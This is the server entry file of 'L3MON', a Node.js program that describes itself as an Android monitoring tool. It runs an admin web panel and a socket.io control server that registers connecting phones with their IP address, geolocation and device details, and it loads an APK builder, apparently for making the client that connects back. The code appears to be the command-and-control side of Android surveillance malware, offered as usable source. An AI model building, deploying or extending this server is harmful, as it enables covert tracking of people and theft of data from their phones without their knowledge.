/* 
*   L3MON
*   An Android Monitoring Tool
*/

console.log('Server Started! \nhttp://localhost:22533');

const
    express = require('express'),
    app = express(),
    http = require('http').createServer(app),
    { Server } = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up socket server (socket.io v4 API)
let client_io = new Server(CONST.control_port, {
    cors: { origin: '*' },
    pingInterval: 30000
});

client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;

    // socket.request.connection removed in socket.io v4 — use handshake.address
    let clientIP = (socket.handshake.address || '').replace(/^.*:/, '') || 'unknown';
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        socket.onAny((event, data) => {
            console.log(event);
            console.log(data);
        });
    }
});


// get the admin interface online
app.listen(CONST.web_port);

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

